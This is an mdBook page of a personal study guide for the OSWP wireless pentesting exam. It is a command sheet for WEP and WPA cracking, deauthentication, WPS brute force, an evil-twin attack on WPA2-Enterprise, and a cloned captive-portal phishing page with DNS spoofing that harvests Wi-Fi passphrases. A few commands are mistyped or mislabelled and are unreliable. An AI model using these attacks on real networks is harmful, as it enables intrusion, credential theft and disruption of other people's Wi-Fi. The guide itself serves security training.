@@ -1,0 +1,581 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Chapter 0.5 - Brandon&#x27;s OSWP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="Roadmap.html"><strong aria-hidden="true">2.</strong> Chapter 0 - Roadmap</a></li><li class="chapter-item expanded "><a href="AllInOne.html" class="active"><strong aria-hidden="true">3.</strong> Chapter 0.5</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">4.</strong> Chapter 1 - Connect</a></li><li class="chapter-item expanded "><a href="Aircrack.html"><strong aria-hidden="true">5.</strong> Chapter 2 - Aircrack</a></li><li class="chapter-item expanded "><a href="Protocol.html"><strong aria-hidden="true">6.</strong> Chapter 3 - Protocol</a></li><li class="chapter-item expanded "><a href="Cracking.html"><strong aria-hidden="true">7.</strong> Chapter 4 - Cracking</a></li><li class="chapter-item expanded "><a href="WEP.html"><strong aria-hidden="true">8.</strong> Chapter 5 - WEP</a></li><li class="chapter-item expanded "><a href="WPA.html"><strong aria-hidden="true">9.</strong> Chapter 6 - WPA</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="CaptivePortal.html"><strong aria-hidden="true">9.1.</strong> Captive Portals</a></li></ol></li><li class="chapter-item expanded "><a href="WPAEnterprise.html"><strong aria-hidden="true">10.</strong> Chapter 7 - WPA Enterprise</a></li><li class="chapter-item expanded "><a href="RogueAP.html"><strong aria-hidden="true">11.</strong> Chapter 8 - Rogue AP</a></li><li class="chapter-item expanded "><a href="Wireshark.html"><strong aria-hidden="true">12.</strong> Chapter 9 - Wireshark</a></li><li class="chapter-item expanded "><a href="bettercap.html"><strong aria-hidden="true">13.</strong> Chapter 10 - bettercap</a></li><li class="chapter-item expanded "><a href="kismet.html"><strong aria-hidden="true">14.</strong> Chapter 11 - Kismet</a></li><li class="chapter-item expanded "><a href="Links.html"><strong aria-hidden="true">15.</strong> Chapter 12 - Links</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSWP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="chapter-05"><a class="header" href="#chapter-05">Chapter 0.5</a></h1>
+<h1 id="oswp-study-guide"><a class="header" href="#oswp-study-guide">OSWP-Study-Guide</a></h1>
+<p>Study guide and command sheet for Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP)</p>
+<h2 id="dependencies"><a class="header" href="#dependencies">Dependencies</a></h2>
+<p>In order to run the following commands, install these frameworks first:</p>
+<pre><code class="language-bash">sudo apt install airmon-ng reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius
+</code></pre>
+<h2 id="open-network-with-mac-filtering"><a class="header" href="#open-network-with-mac-filtering">Open Network with MAC filtering</a></h2>
+<p>In the event that fake authentication persistently fails, it is plausible that MAC address filtering is being employed. Under such a scheme, the Access Point (AP) will only permit connections from a predefined list of MAC addresses. Should this be the scenario, it will be necessary to acquire a legitimate MAC address by monitoring network traffic with the aid of Airodump-ng. Subsequently, impersonation of this MAC address should be carried out once the corresponding client has disconnected from the network. It is imperative to refrain from initiating a fake authentication attack targeting a specific MAC address if the client remains active on the AP.</p>
+<h3 id="packet-capture"><a class="header" href="#packet-capture">Packet capture</a></h3>
+<pre><code class="language-bash">airodump-ng -w &lt;CAPTURE_NAME&gt; -c &lt;CHANNEL&gt; --bssid &lt;BSSID&gt; &lt;INTERFACE&gt;
+</code></pre>
+<h3 id="get-your-mac-address"><a class="header" href="#get-your-mac-address">Get your MAC address</a></h3>
+<pre><code class="language-bash">macchanger --show &lt;INTERFACE&gt;
+</code></pre>
+<h3 id="fake-authentication-attack"><a class="header" href="#fake-authentication-attack">Fake authentication attack</a></h3>
+<pre><code class="language-bash">aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;YOUR_MAC&gt; &lt;INTERFACE&gt;
+</code></pre>
+<h3 id="arp-replay-attack"><a class="header" href="#arp-replay-attack">ARP replay attack</a></h3>
+<pre><code class="language-bash">aireplay-ng -3 -b &lt;BSSID&gt; -h &lt;YOUR_MAC&gt; &lt;INTERFACE&gt;
+</code></pre>
+<h3 id="deauthentication-attack"><a class="header" href="#deauthentication-attack">Deauthentication attack</a></h3>
+<pre><code class="language-bash">aireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;CLIENT_MAC&gt; &lt;INTERFACE&gt;
+</code></pre>
+<h3 id="crack"><a class="header" href="#crack">Crack</a></h3>
+<pre><code class="language-bash">aircrack-ng &lt;CAPTURE_NAME&gt;
+</code></pre>
+<h2 id="wep-wired-equivalent-privacy"><a class="header" href="#wep-wired-equivalent-privacy">WEP (Wired Equivalent Privacy)</a></h2>
+<p>WEP is a severely flawed security algorithm for IEEE 802.11 wireless networks. Below are the steps to exploit WEP vulnerabilities:</p>
+<h3 id="step-1-kill-conflicting-processes"><a class="header" href="#step-1-kill-conflicting-processes">Step 1: Kill conflicting processes</a></h3>
+<pre><code class="language-bash">sudo airmon-ng check kill
+</code></pre>
+<h3 id="step-2-start-monitor-mode-on-wlan0"><a class="header" href="#step-2-start-monitor-mode-on-wlan0">Step 2: Start monitor mode on wlan0</a></h3>
+<pre><code class="language-bash">sudo airmon-ng start wlan0
+</code></pre>
+<h3 id="step-3-scan-for-wep-networks"><a class="header" href="#step-3-scan-for-wep-networks">Step 3: Scan for WEP networks</a></h3>
+<pre><code class="language-bash">sudo airodump-ng wlan0mon --encrypt WEP
+</code></pre>
+<h3 id="step-4-capture-ivs"><a class="header" href="#step-4-capture-ivs">Step 4: Capture IVs</a></h3>
+<pre><code class="language-bash">besside-ng -c Channel -b BSSID wlan0mon
+</code></pre>
+<h3 id="step-5-crack-wep-key"><a class="header" href="#step-5-crack-wep-key">Step 5: Crack WEP key</a></h3>
+<pre><code class="language-bash">aircrack-ng ./wep.cap
+</code></pre>
+<h3 id="additional-wep-attacks"><a class="header" href="#additional-wep-attacks">Additional WEP Attacks:</a></h3>
+<ul>
+<li><a href="https://pentestlab.blog/2015/02/03/hirte-attack/">Hirte Attack</a></li>
+<li><a href="https://www.computerworld.com/article/2539400/cafe-latte-attack-steals-data-from-wi-fi-users.html">Caffe Latte Attck</a></li>
+</ul>
+<h2 id="wps-wi-fi-protected-setup"><a class="header" href="#wps-wi-fi-protected-setup">WPS (Wi-Fi Protected Setup)</a></h2>
+<p>WPS was originally known as Wi-Fi Simple Configuration, aiming to unify vendor technologies for secure WPA/WPA2 passphrase sharing. However, it has its set of vulnerabilities. Below are the steps to identify and exploit WPS vulnerabilities:</p>
+<h3 id="identifying-access-points-with-wps-enabled"><a class="header" href="#identifying-access-points-with-wps-enabled">Identifying access points with WPS enabled</a></h3>
+<pre><code class="language-bash">wash -i &lt;INTERFACE&gt; -s
+</code></pre>
+<h3 id="fake-authentication-attack-1"><a class="header" href="#fake-authentication-attack-1">Fake authentication attack</a></h3>
+<pre><code class="language-bash">aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;YOUR_MAC&gt; &lt;INTERFACE&gt;
+</code></pre>
+<h3 id="offline-brute-force-pixie-dust"><a class="header" href="#offline-brute-force-pixie-dust">Offline brute force (pixie dust)</a></h3>
+<pre><code class="language-bash">reaver -i wlan0 -b BSSID -SNLAvv  -c 1 -K
+</code></pre>
+<h3 id="online-brute-force"><a class="header" href="#online-brute-force">Online brute force</a></h3>
+<pre><code class="language-bash">reaver -i &lt;INTERFACE&gt; -b &lt;BSSID&gt; -SNLAsvv -d 1 -r 5:3 -c &lt;CHANNEL_NUMBER&gt;
+</code></pre>
+<h2 id="wpawpa2wpa3-testing"><a class="header" href="#wpawpa2wpa3-testing">WPA/WPA2/WPA3 Testing</a></h2>
+<p>Steps for testing security on networks with WPA/WPA2/WPA3 encryption, including setting up rogue APs and capturing handshakes:</p>
+<h2 id="wpa2-enterprise"><a class="header" href="#wpa2-enterprise">WPA2 Enterprise</a></h2>
+<p>Follow these steps to set up wireless monitoring and perform the attack.</p>
+<h3 id="step-1-activate-monitoring-mode"><a class="header" href="#step-1-activate-monitoring-mode">Step 1: Activate monitoring mode</a></h3>
+<pre><code class="language-bash">airmon-ng check kill &amp;&amp; airmon-ng start &lt;interface&gt;
+</code></pre>
+<h3 id="step-2-check-auth-column"><a class="header" href="#step-2-check-auth-column">Step 2: Check AUTH column</a></h3>
+<pre><code class="language-bash">airodump-ng &lt;interface&gt;
+</code></pre>
+<p><em>Note: The AUTH column will say MGT.</em></p>
+<h3 id="step-3-capture-the-handshake"><a class="header" href="#step-3-capture-the-handshake">Step 3: Capture the handshake</a></h3>
+<pre><code class="language-bash">sudo airodump-ng -c channel -w ESSID interface
+</code></pre>
+<h3 id="step-4-deauthenticate-the-client-to-capture-the-handshake"><a class="header" href="#step-4-deauthenticate-the-client-to-capture-the-handshake">Step 4: Deauthenticate the client to capture the handshake</a></h3>
+<pre><code class="language-bash">aireplay-ng -0 0 -a ESSID -c client_ESSID interface
+</code></pre>
+<h3 id="step-5-analyze-with-wireshark-or-tshark"><a class="header" href="#step-5-analyze-with-wireshark-or-tshark">Step 5: Analyze with Wireshark or tshark</a></h3>
+<p>After gathering the BSSID, ESSID, and channel:</p>
+<ul>
+<li>Use Wireshark or tshark with filters:
+<pre><code class="language-bash">wlan.bssid==E8:9C:12:02:66:AA &amp;&amp; eap &amp;&amp; tls.handshake.certificate
+</code></pre>
+or
+<pre><code class="language-bash">tls.handshake.type == 11,3
+</code></pre>
+</li>
+</ul>
+<h3 id="step-6-save-certificates-using-openssl"><a class="header" href="#step-6-save-certificates-using-openssl">Step 6: Save certificates using OpenSSL</a></h3>
+<p>View the Packet Details in TLSv1 Record Layer &gt;&gt; Handshake Protocol &gt;&gt; Certificate:</p>
+<pre><code class="language-bash">openssl x509 -inform der -in cert.der -text
+</code></pre>
+<p><em>Details needed for the attack include: Issuer information.</em></p>
+<h3 id="step-65-optional-convert-the-certificate-to-pem-format"><a class="header" href="#step-65-optional-convert-the-certificate-to-pem-format">Step 6.5 (Optional): Convert the certificate to PEM format</a></h3>
+<pre><code class="language-bash">openssl x509 -inform der -in cert.der -outform pem -out output.crt
+</code></pre>
+<h3 id="step-7-set-up-freeradius-server"><a class="header" href="#step-7-set-up-freeradius-server">Step 7: Set up FreeRADIUS server</a></h3>
+<p>Install with:</p>
+<pre><code class="language-bash">sudo apt install freeradius
+</code></pre>
+<p>Edit the <code>ca.cnf</code> and <code>server.cnf</code> files to have less suspicious certificate authority fields.</p>
+<pre><code class="language-bash">sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
+sudo mousepad /etc/freeradius/3.0/certs/server.cnf
+</code></pre>
+<p>Update the respective sections with the correct information.</p>
+<h3 id="step-8-prepare-the-certificates"><a class="header" href="#step-8-prepare-the-certificates">Step 8: Prepare the certificates</a></h3>
+<p>Navigate to <code>/etc/freeradius/3.0/certs/</code> and run:</p>
+<pre><code class="language-bash">sudo rm dh &amp;&amp; make
+</code></pre>
+<p><em>Note: Ignore the error from FreeRADIUS if it expects other configurations.</em></p>
+<h3 id="step-9-configure-hostapd-mana"><a class="header" href="#step-9-configure-hostapd-mana">Step 9: Configure hostapd-mana</a></h3>
+<p>Edit <code>/etc/hostapd-mana/mana.conf</code> with the correct SSID, Certificate paths, and EAP file.</p>
+<h3 id="step-10-set-up-manaeap_user"><a class="header" href="#step-10-set-up-manaeap_user">Step 10: Set up <code>mana.eap_user</code></a></h3>
+<p>Configure <code>/etc/hostapd-mana/mana.eap_user</code> with the desired protocols and authentication methods.</p>
+<h3 id="step-11-start-hostapd-mana"><a class="header" href="#step-11-start-hostapd-mana">Step 11: Start hostapd-mana</a></h3>
+<pre><code class="language-bash">hostapd-mana /etc/hostapd-mana/mana.conf
+</code></pre>
+<h3 id="step-12-use-asleap-to-find-a-user"><a class="header" href="#step-12-use-asleap-to-find-a-user">Step 12: Use asleap to find a user</a></h3>
+<p>Run asleap with the correct command to find a user with a successful login.</p>
+<pre><code class="language-bash">&lt;asleap command&gt; -W /usr/share/john/password.lst
+</code></pre>
+<h3 id="step-13-create-wpa_supplicantconf-file"><a class="header" href="#step-13-create-wpa_supplicantconf-file">Step 13: Create <code>wpa_supplicant.conf</code> file</a></h3>
+<p>Add the network configuration details:</p>
+<pre><code class="language-bash">network={
+  ssid="NetworkName"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  identity="Domain\\username"
+  password="password"
+  eap=PEAP
+  phase1="peaplabel=0"
+  phase2="auth=MSCHAPV2"
+}
+</code></pre>
+<h3 id="step-14-connect-to-the-network"><a class="header" href="#step-14-connect-to-the-network">Step 14: Connect to the network</a></h3>
+<p>Use <code>wpa_supplicant</code> to connect:</p>
+<pre><code class="language-bash">wpa_supplicant -c &lt;config file&gt;
+</code></pre>
+<h2 id="rogue-access-points"><a class="header" href="#rogue-access-points">Rogue Access Points</a></h2>
+<p>Instructions for creating a rogue AP.</p>
+<h3 id="discovery"><a class="header" href="#discovery">Discovery</a></h3>
+<pre><code class="language-bash">sudo airodump-ng -w capturename –output-format pcap wlan0mon
+</code></pre>
+<p><strong>Wireshark Filters:</strong></p>
+<pre><code class="language-bash">wlan.fc.type_subtype == 0x08 #Broadcast Frames
+wlan.ssid == “apname” #AP name
+</code></pre>
+<p>Filters can be appended to filter for broadcast frames from a specific AP:</p>
+<pre><code class="language-bash">wlan.fc.type_subtype == 0x08 &amp;&amp; wlan.ssid == “apname”
+</code></pre>
+<p>The interesting parts are in Tag: Vendor Specific: &amp; Tag: RSN: Information</p>
+<h3 id="creating-a-rogue-ap"><a class="header" href="#creating-a-rogue-ap">Creating a Rogue AP</a></h3>
+<p>Hostapd-mana template location:</p>
+<pre><code class="language-bash">/etc/hostapd-mana/hostapd-mana.conf
+</code></pre>
+<p>Or you may download the hostapd-mana.config in this repository and modify to your needs.</p>
+<p>Start hostapd-mana:</p>
+<pre><code class="language-bash">sudo hostapd-mana hostapd-mana.conf
+</code></pre>
+<h3 id="cracking-hccapx-files"><a class="header" href="#cracking-hccapx-files">Cracking .hccapx Files</a></h3>
+<p><strong>aircrack:</strong></p>
+<pre><code class="language-bash">aircrack-ng name.hccapx -w /wordlist/rockyou.txt
+</code></pre>
+<p>If you run into errors, you may try:</p>
+<pre><code class="language-bash">aircrack-ng name.hccapx -e ESSID -w /wordlist/rockyou.txt
+</code></pre>
+<p><strong>hashcat:</strong></p>
+<pre><code>hashcat -m 2500 capture.hccapx /usr/share/worlists/rockyou.txt
+</code></pre>
+<h2 id="attacking-captive-portals"><a class="header" href="#attacking-captive-portals">Attacking Captive Portals</a></h2>
+<p>This guide provides step-by-step instructions for setting up a wireless network monitoring and attack environment.</p>
+<h3 id="1-set-interface-to-monitor-mode"><a class="header" href="#1-set-interface-to-monitor-mode">1. Set Interface to Monitor Mode</a></h3>
+<p>Begin by capturing information about clients and access points (APs) around you:</p>
+<pre><code class="language-bash">sudo airodump-ng wlan0mon
+</code></pre>
+<h3 id="2-adjust-the-capture"><a class="header" href="#2-adjust-the-capture">2. Adjust the Capture</a></h3>
+<p>To specify the capture details, use:</p>
+<pre><code class="language-bash">sudo airodump-ng -w fileName –output-format pcap -c channelnumber interface
+</code></pre>
+<h3 id="3-de-authenticate-connected-devices"><a class="header" href="#3-de-authenticate-connected-devices">3. De-authenticate Connected Devices</a></h3>
+<p>Wait until the WPA handshake is captured:</p>
+<pre><code class="language-bash">sudo aireplay-ng -0 amountOfdeauths -a ApBSSID interface
+</code></pre>
+<h3 id="4-disable-monitor-mode"><a class="header" href="#4-disable-monitor-mode">4. Disable Monitor Mode</a></h3>
+<p>After completing the capture, disable monitor mode:</p>
+<pre><code class="language-bash">sudo apt install apache2 libapache2-mod-php
+</code></pre>
+<h3 id="5-download-the-example-page"><a class="header" href="#5-download-the-example-page">5. Download the Example Page</a></h3>
+<p>Use <code>wget</code> to download the webpage. Here, <code>-l2</code> means to go 2 levels deep:</p>
+<pre><code class="language-bash">wget -r -l2 https://www.website.com
+</code></pre>
+<h3 id="6-prepare-the-web-directory"><a class="header" href="#6-prepare-the-web-directory">6. Prepare the Web Directory</a></h3>
+<p>Create a directory for the phishing webpage:</p>
+<pre><code class="language-bash">sudo mkdir /var/www/html/portal &amp;&amp; sudo mousepad /var/www/html/portal/index.php
+</code></pre>
+<h3 id="7-replicate-the-websites-style"><a class="header" href="#7-replicate-the-websites-style">7. Replicate the Website's Style</a></h3>
+<p>Replicate the styling of the example website page and copy the assets:</p>
+<pre><code class="language-bash">sudo cp -r ./www.website.com/assets /var/www/html/portal
+</code></pre>
+<h3 id="8-set-up-the-login-page"><a class="header" href="#8-set-up-the-login-page">8. Set Up the Login Page</a></h3>
+<p>Configure the login page to redirect to <code>login_check.php</code>:</p>
+<pre><code class="language-bash">sudo mousepad /var/www/html/portal/login_check.php
+</code></pre>
+<h3 id="9-assign-an-ip-address-and-activate-the-interface"><a class="header" href="#9-assign-an-ip-address-and-activate-the-interface">9. Assign an IP address and activate the interface:</a></h3>
+<pre><code class="language-bash">sudo ip addr add 192.168.87.1/24 dev wlan0
+sudo ip link set wlan0 up
+</code></pre>
+<h3 id="10-ensure-dnsmasq-is-installed"><a class="header" href="#10-ensure-dnsmasq-is-installed">10. Ensure dnsmasq is installed:</a></h3>
+<pre><code class="language-bash">sudo apt install dnsmasq
+</code></pre>
+<h3 id="11-create-the-dhcp-config-file-at-homekalidnsmasqconf-and-add-spoofing-entries-for-top-level-domains"><a class="header" href="#11-create-the-dhcp-config-file-at-homekalidnsmasqconf-and-add-spoofing-entries-for-top-level-domains">11. Create the DHCP config file at <code>/home/kali/dnsmasq.conf</code> and add spoofing entries for top-level domains:</a></h3>
+<pre><code class="language-bash">address=/com/192.168.0.1
+address=/org/192.168.0.1
+address=/net/192.168.0.1
+</code></pre>
+<h3 id="12-for-windows-7--10-captive-portal-detection-add"><a class="header" href="#12-for-windows-7--10-captive-portal-detection-add">12. For Windows 7 &amp; 10 captive portal detection, add:</a></h3>
+<pre><code class="language-bash">address=/dns.msftncsicom/131.107.255.255  
+</code></pre>
+<h3 id="13-start-dnsmasq-with-the-config-file"><a class="header" href="#13-start-dnsmasq-with-the-config-file">13. Start dnsmasq with the config file:</a></h3>
+<pre><code class="language-bash">sudo dnsmasq –conf-file=dnsmasq.com
+</code></pre>
+<h3 id="14-verify-if-dnsmasq-is-running-successfully"><a class="header" href="#14-verify-if-dnsmasq-is-running-successfully">14. Verify if dnsmasq is running successfully:</a></h3>
+<pre><code class="language-bash">sudo tail /var/log/syslog | grep dnsmasq
+</code></pre>
+<h3 id="15-install-nftables"><a class="header" href="#15-install-nftables">15. Install nftables:</a></h3>
+<pre><code class="language-bash">sudo apt install nftables
+</code></pre>
+<h3 id="16-add-required-rules"><a class="header" href="#16-add-required-rules">16. Add required rules:</a></h3>
+<pre><code class="language-bash">sudo nft add table ip nat
+sudo nft ‘add chain ip nat PREROUTING { type nat hook prerouting priority dstnat; policy; accept; }’
+sudo nft add rule ip nat PREROUTING iifname “wlan0” udp dport 53 counter redirect to :53
+</code></pre>
+<h3 id="17-modify-apache-configuration"><a class="header" href="#17-modify-apache-configuration">17. Modify Apache configuration:</a></h3>
+<pre><code class="language-bash">sudo mousepad /etc/apache2/sites-enabled/000-default.conf
+</code></pre>
+<h3 id="18-enable-necessary-modules-and-restart-apache"><a class="header" href="#18-enable-necessary-modules-and-restart-apache">18. Enable necessary modules and restart Apache:</a></h3>
+<pre><code class="language-bash">sudo a2enmod rewrite &amp;&amp; sudo a2enmod alias
+sudo systemctl restart apache2
+</code></pre>
+<h3 id="19-check-the-portal-by-navigating-to"><a class="header" href="#19-check-the-portal-by-navigating-to">19. Check the portal by navigating to:</a></h3>
+<pre><code class="language-bash">Firefox 127.0.0.1/portal/index.php
+</code></pre>
+<h3 id="20-install-hostapd-and-edit-the-configuration"><a class="header" href="#20-install-hostapd-and-edit-the-configuration">20. Install hostapd and edit the configuration:</a></h3>
+<pre><code class="language-bash">sudo apt install hostapd &amp;&amp; mousepad hostapd.conf
+</code></pre>
+<h3 id="21-create-and-run-a-80211n-ap"><a class="header" href="#21-create-and-run-a-80211n-ap">21. Create and run a 802.11n AP:</a></h3>
+<pre><code class="language-bash">sudo hostapd -B hostapd.conf
+</code></pre>
+<h3 id="22-monitor-the-logs-in-two-separate-terminals"><a class="header" href="#22-monitor-the-logs-in-two-separate-terminals">22. Monitor the logs in two separate terminals:</a></h3>
+<ul>
+<li>Terminal 1:</li>
+</ul>
+<pre><code class="language-bash">sudo tail -f /var/log/syslog | grep -E ‘(dnsmasq|hostapd)’
+</code></pre>
+<ul>
+<li>Terminal 2:</li>
+</ul>
+<pre><code class="language-bash">sudo tail -f /var/log/apache2/access.log
+</code></pre>
+<h3 id="23-search-for-passphrase-files-in-tmp"><a class="header" href="#23-search-for-passphrase-files-in-tmp">23. Search for passphrase files in <code>/tmp/</code>:</a></h3>
+<pre><code class="language-bash">sudo find /tmp/ -iname passphrase.txt
+</code></pre>
+<h3 id="24-read-the-contents-of-the-passphrase-file"><a class="header" href="#24-read-the-contents-of-the-passphrase-file">24. Read the contents of the passphrase file:</a></h3>
+<pre><code class="language-bash">sudo cat /tmp/systemd-private-b37…aef-apache2.service-b...i/tmp/passphrase.txt
+</code></pre>
+<h2 id="information-discovery-example"><a class="header" href="#information-discovery-example">Information Discovery Example</a></h2>
+<pre><code class="language-bash">- ESSID of JesusIsTheWay
+- BSSID of 34:5a:90:e0:5a:30
+- WPS  (AES/CCM)
+- Uses a PSK
+- Runs on channel 1
+</code></pre>
+<h2 id="definitions"><a class="header" href="#definitions">Definitions</a></h2>
+<ul>
+<li>AP: Access Point</li>
+<li>BSSID: Basic Service Set Identifier is a 48-bit number that follows MAC address conventions.</li>
+<li>ESSID: Extended Service Set Identifier is a unique identifier to avoid interference on a wireless network.</li>
+</ul>
+<h2 id="troubleshooting"><a class="header" href="#troubleshooting">Troubleshooting</a></h2>
+<ul>
+<li>Make sure that hostapd-mana is installed on Kali. Default installations currently feature hostapd, hostapd-wpa and hostapd_cli. None of these frameworks feature the <em>mana_wpaout</em> section in the <em>hostapd-mana.config</em>, and will result in error: <em>unknown configuration item 'mana_wpaout'</em></li>
+<li>When starting the exam, fist thing after connecting to the .ovpn is to test both <strong>SSH</strong> and <strong>RDP</strong> protocols to ensure connection works as intended.</li>
+<li>In order to list wireless interfaces, execute command:</li>
+</ul>
+<pre><code class="language-bash">sudo airmon-ng
+</code></pre>
+<ul>
+<li>To restart Network Manager, execute command:</li>
+</ul>
+<pre><code class="language-bash">systemctl restart NetworkManager.service
+</code></pre>
+<h2 id="sources"><a class="header" href="#sources">Sources</a></h2>
+<ul>
+<li><a href="https://liodeus.github.io/2020/10/29/OSWP-personal-cheatsheet.html">LIODEUS OSWP Cheatsheet</a></li>
+<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat File Formats</a></li>
+<li><a href="https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2">Hashcat Cracking WPA/WPA2</a></li>
+</ul>
+<h2 id="hostapd-manaconf-template"><a class="header" href="#hostapd-manaconf-template">hostapd-mana.conf template</a></h2>
+<pre><code># Template Config File for hostapd-mana command:
+interface=wlan0
+ssid=apname
+channel=1
+ieee80211n=1
+hw_mode=g # if 5ghz, set to a
+wpa=3 # 1 only enables WPA, 2 is WPA2
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=ANYPASSWORD # actual value irrelevant, as we are trying to capture handshake, has to be between 8 - 63 characters
+wpa_pairwise=TKIP CCMP # WPA only
+rsn_pairwise =TKIP CCMP # WPA2 only, since using option 3, we enable both
